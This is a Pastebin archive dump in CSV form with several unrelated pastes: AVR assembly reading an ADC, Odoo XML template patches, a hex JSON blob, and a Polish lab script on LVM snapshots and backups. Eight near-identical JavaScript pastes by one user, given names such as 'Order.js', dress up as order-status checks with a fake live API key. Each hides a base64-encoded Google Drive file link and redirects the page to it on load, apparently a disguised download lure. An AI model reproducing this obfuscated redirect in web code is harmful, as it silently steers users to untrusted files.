id,title,username,language,date,content
7S5Hszs8,Untitled,sombruxo,ASM (NASM),Friday 11th of April 2025 06:19:42 AM CDT,"start:
	ldi r16, 0b11111111
	out ddrd, r16
	RCALL config_salida ;Puerto para ver el valor convertido.
	RCALL config_ADC ;Configurar el conversor ADC
	conv:
		LDS r17, ADCSRA
		ORI r17, (1<< ADSC)
		STS ADCSRA, r17
		bit:
			LDS r20, ADCSRA
			SBRC r20, ADSC
			rjmp bit
		LDS r21, ADCH
		LDI r22, 255
		sub r22, r21
		out OCR0A, r22
	rjmp conv


config_ADC_v2:
	push r16
	LDI R16, (1<<ADEN)
	;ADC Enable
	ORI R16, (0<<ADATE)
	;ADC Auto Trigger Enable
	ORI R16, (1<<ADPS2) | (1<<ADPS1) | (1<<ADPS0)
	;ADPSx=3: ADC Prescaler Select Bits (ADPS2:0=111 -> 128)
	STS ADCSRA, R16
	;_> ADOSRA: The ADC Control and Status register A
	LDI R16, (0<<ADTS2) | (0<<ADTS1) | (1<<ADTS0)
	;ADTSx-1: trigger source Analog Comparator
	STS ADCSRB, R16
	;-> ADCSRB: The ADC Control and Status register B
	LDI R16, (1<<MUX0)
	;MUXx-1: input channel 1: MUX5:0-00001
	ORI R16, (0<<REFS1) | (1<<REFS0)
	;AREF-1: internal SV reference (REF$1:0-01)
	ORI R16, (1<<ADLAR)
	;ADC 8 bits resolution
	STS ADMUX, R16
	; -> ADMUX: The ADC multiplexer Selection Register
	LDI R16, (1<<ADC1D)
	;ADC disable digital input circuitry for channel 1 (saves
	energy)
	STS DIDR0, R16
	; -> DIDRO: Digital Input Disable Register
	LDI R16, (0<<PRADC)
	;ADC disable the power reduction saving for the ADC circuitry
	(not necesary)
	STS PRR, R16
	;-> PRR: Power Reduction Register
	pop r16
RET"
ppMRMLSd,Products.js,reflezzzz,JavaScript,Friday 11th of April 2025 06:07:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/01175/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
bgh7VdHh,dataNone,TestGuy1,JSON,Friday 11th of April 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '88a5c0ef4dd695ca32bfbed7244e2aea588fc39577b54b4624261a654bd6d8a75ab19e20d32d0728e853dbe92e3cac4bb76352f311b9fe5dc7fb40151c12edf7fe0e402a6731eee1a10644cda9139d12cc3a30f8f22a2a1222bc6657c00a9ca538d5d29d5835d91316c638213d7749f1625386edb7a17ca91eb5d59ba3c0ef94',
  otherdata: [
    '251f1c6e4925827d522ae7939f0c3ea6',
    '991a98845f7714e3aafe0d3b8227b2a2',
    'd97eab6a60cc49179cf3a7b02972f901',
    'e9721b67fb1d38e35e1139dd686d1db5',
    '8f92b65742300ae92b1248812c208091',
    '07e39329d3d025cfec7944faf9e93e83',
    '6a9a88c00b12ca123b8156d08f3737c9',
    '9694e4fcda13b9e52f0d2c1c6ab2e8aa'
  ]
}"
dz7xACMz,Order.js,reflezzzz,JavaScript,Friday 11th of April 2025 05:52:11 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/20865/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Jztqri76,Market.js,reflezzzz,JavaScript,Friday 11th of April 2025 05:36:49 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/03192/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iz0JW2NH,[QW][4707618]remove_shipping_invoicing_address_sale_order_portal_content,rht_odoo,XML,Friday 11th of April 2025 05:22:16 AM CDT,"<data>
    <!--
    Done by RHT on the 11/04/2025
    Need : remove the shipping and invoicing address
    Task : https://www.odoo.com/odoo/project.task/4707618
    Pastebin : https://pastebin.com/iz0JW2NH
    -->
    <xpath expr=""//div[@id='customer_info']"" position=""replace""/>
</data>"
xiae0U9Z,Untitled,reflezzzz,JavaScript,Friday 11th of April 2025 05:21:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/50046/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mb8tWmDV,sysopv2_3.1.5,pan7nikt,Bash,Friday 11th of April 2025 05:14:16 AM CDT,"sudo fdisk /dev/sda
#n
#4 lub enter
#enter
#+1G
#t
#4
#44
#w
sudo pvcreate /dev/sda4
sudo vgextend fedora /dev/sda4
sudo lvextend -L +400M /dev/fedora/home
sudo resize2fs /dev/fedora/home

lsblk
 
sudo fdisk /dev/sdb
#g
#n
#enter lub 1
#enter
#+2G
#w
sudo mkfs.xfs /dev/sdb1
sudo mkdir /mnt/kopia
sudo mount /dev/sdb1 /mnt/kopia/
#sprawdzamy juz do 3.1.5.3
echo -e '\033[0;32m3.1.5.3\033[0m';
sudo vgdisplay fedora | grep ""Free  PE""

echo -e '\033[0;32mTWORZENIE MIGAWKI\033[0m';
sudo lvcreate -s -L 100M -pr -n migawka_home /dev/fedora/home
#sprawdzamy juz do 3.1.5.3 po utworzeniu migawki
sudo vgdisplay fedora | grep ""Free  PE""
sudo dump -0 -f /mnt/kopia/kopia_home /home/tytus

#Sprawdzenie, że źródło /home i miejsce zapisu /mnt/kopia są na innych urządzeniach
df /home | grep /dev/mapper/fedora-home
df /mnt/kopia/kopia_home | grep /dev/sdb1
sudo lvdisplay /dev/fedora/migawka_home


#1. Jakie cechy musi posiadać kopia, aby była kopią zapasową? Utwórz narzędziem dump kopię zawierającą pliki regularne z katalogu domowego wybranego użytkownika nieuprzywilejowanego i wykaż, że spełnia wymagania kopii zapasowej, wykaż znacznik czasu z momentu, z którego pochodzą dane zawarte w utworzonej kopii.

echo -e '\033[0;32m--------3.1.5.1--------\nKopia zapasowa musi byc:\n- Spojna w czasie \033[0m(stan plikow z tej samej chwili czasu)\033[0;32m\n- Tworzona regularnie\n- Powinna byc zabezpieczona przed nieautoryzowanym dostepem, uszkodzeniem czy utrata\n- Przechowywana na innym fizycznym nosniku danych\033[0m';
sudo lvdisplay /dev/fedora/migawka_home | grep --color -E ""LV Creation host, time|$""


#2. Dlaczego narzędziem dump utworzono kopię zapasową odczytując dane z wolumenu logicznego migawki a nie z wolumenu logicznego, dla którego utworzono migawkę oraz jaka jest różnica w danych odczytanych bezpośrednio z wolumenu logicznego home i z wolumenu logicznego migawki utworzonej dla wolumenu logicznego home?

echo -e '\033[0;32m--------3.1.5.2--------\n\nPoniewaz migawki udostepniaja spojny stan zawartosci wolumenu logicznego bez koniecznosci zatrzymania realizacji operacji wejscia/wyjscia (spojny czas, mniej bledow)\n\nRóżnica polega na spójności i aktualności danych:\nDane z wolumenu logicznego home (czyli z /dev/fedora/home):\n- mogą zmieniać się w trakcie odczytu\n- przez to kopie zapasowe mogą być niespójne (część danych z różnych momentów w czasie)\n\nDane z wolumenu migawki migawka_home:\n- reprezentują dokładny, spójny stan systemu plików z chwili utworzenia migawki,\n- nie zmieniają się podczas backupu (nawet jeśli oryginalne dane są modyfikowane),\n- są więc idealnym źródłem do tworzenia kopii zapasowej, bo zapewniają pełną integralność danych.\033[0m';



#3. O ile zmniejszyła się wolna przestrzeń danych po utworzeniu migawki  w grupie wolumenów? - należy wykazać liczbę wolnych jednostek PE w grupie wolumenów przed i po utworzeniu migawki.

#Wykonano juz wczesniej, ale ewentualnie:
echo -e '\033[0;32m--------3.1.5.3--------\033[0m';

sudo vgdisplay fedora | grep ""Free  PE""
  Free  PE / Size       131 / 524,00 MiB

sudo lvcreate -s -L 100M -pr -n migawka_home /dev/fedora/home
  Logical Volume ""migawka_home"" already exists in volume group ""fedora""

sudo lvcreate -s -L 100M -pr -n migawka_home_2 /dev/fedora/home
  Logical volume ""migawka_home_2"" created.

sudo vgdisplay fedora | grep ""Free  PE""
  Free  PE / Size       106 / 424,00 MiB


#4. Wyjaśnienie zasady działania wykonanej migawki wolumenu LVM, która pracuje w trybie pracy tylko do odczytu.

echo -e '\033[0;32m--------3.1.5.4--------\n\nMigawka wolumenu LVM pracująca w trybie tylko do odczytu działa w oparciu o mechanizm Copy-On-Write.\nW momencie utworzenia migawki, system zapisuje stan wolumenu logicznego z danej chwili.\nGdy dane na oryginalnym wolumenie zostaną zmienione, ich oryginalna wersja jest kopiowana do specjalnego bufora (COW). \nDzięki temu migawka przechowuje niezmieniony, spójny obraz danych z momentu jej utworzenia. Migawka w trybie read-only służy wyłącznie do odczytu i nie może być modyfikowana — idealnie nadaje się do tworzenia kopii zapasowej bez przerywania pracy systemu.\033[0m';

#5. Kiedy stworzona migawka staje się bezużyteczna i wykazać, jak rozpoznać bezużyteczną migawkę? - wymagane zaprezentowanie dla migawki pracującej w trybie tylko do odczytu z najmniejszym możliwym rozmiarem bufora migawki.
echo -e '\033[0;32m--------3.1.5.5--------\n\033[0m';
lvcreate -L 1M -p r -s -n mala_migawka4 /dev/fedora/home
lvdisplay /dev/fedora/mala_migawka4 | grep --color -E ""active|4,00 MiB|Allocated to snapshot|$""

#LV snapshot status: active destination for home → wszystko OK.
#COW-table size: 4,00 MiB → to cały bufor zmian.
#Allocated to snapshot: 0,29% → bufor prawie pusty.

echo -e '\033[0;32m--------ZAPELNIANIE MIGAWKI--------\n\033[0m';
lvs | grep --color -E ""Data%|$"" | grep --color -E ""Data%|mala_migawka4|$""

dd if=/dev/zero of=plik4MiB bs=1M count=4

lvdisplay /dev/fedora/mala_migawka4 | grep --color -E ""INACTIVE|$""

#LV snapshot status     INACTIVE destination for home

lvs | grep --color -E ""Data%|mala_migawka4|100,00 |$""

#Data% = 100,00 → bufor migawki jest w pełni zapełniony.

echo -e '\033[0;32mMigawka przestaje być użyteczna, gdy bufor COW osiągnie 100%. Stan danych przestaje wtedy odpowiadać chwili jej utworzenia — nie można jej uznać za spójną w czasie.\033[0m';

#6. Należy utworzyć migawkę wolumenu logicznego home pracującą w trybie odczyt/zapis, która zawsze będzie aktywna.
echo -e '\033[0;32m--------3.1.5.6--------\n\033[0m';
sudo fdisk /dev/sdb
# n → nowa partycja
# enter 3
# enter
# +10G
# w
sudo pvcreate /dev/sdb3
sudo vgextend fedora /dev/sdb3


sudo lvcreate -L 4G -s -n migawka_home_rw /dev/fedora/home

sudo lvdisplay /dev/fedora/home | grep ""LV Size""
  LV Size                3,39 GiB


sudo lvdisplay /dev/fedora/migawka_home_rw | grep --color -E ""COW-table size|$""
 COW-table size         <3,41 GiB

#ewentualnie dd if=/dev/zero of=/home/sysop/testfile bs=1M count=300
#lvs

echo -e '\033[0;32mMigawka będzie zawsze aktywna, jeśli rozmiar bufora COW jest równy lub większy niż rozmiar wolumenu, dla którego została utworzona. Wówczas zmodyfikowane bloki nie przekroczą dostępnej przestrzeni.\033[0m';

#USUWANIE MIGAWEK:
sudo lvremove /dev/fedora/migawka_small

#DUMPY:
sudo dump -0uf /backup/tytus.dump /dev/fedora/migawka_home
ls /backup/
"
jYzbkjAm,[QW][4707618]remove_shipping_invoicing_address_report_saleorder_document,rht_odoo,XML,Friday 11th of April 2025 05:10:47 AM CDT,"<data>
    <!--
    Done by RHT on the 11/04/2025
    Need : remove the shipping and invoicing address
    Task : https://www.odoo.com/odoo/project.task/4707618
    Pastebin : https://pastebin.com/jYzbkjAm
    -->
    <xpath expr=""//t[@t-set='information_block']"" position=""replace""/>
</data>"
u1euZfe3,Products.js,reflezzzz,JavaScript,Friday 11th of April 2025 05:05:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56271/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
yrMLMydA,Order.js,reflezzzz,JavaScript,Friday 11th of April 2025 04:50:34 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/61214/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
38wJKy8u,Market.js,reflezzzz,JavaScript,Friday 11th of April 2025 04:35:11 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/27936/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ScN0tMUe,Untitled,reflezzzz,JavaScript,Friday 11th of April 2025 04:19:34 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/43818/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
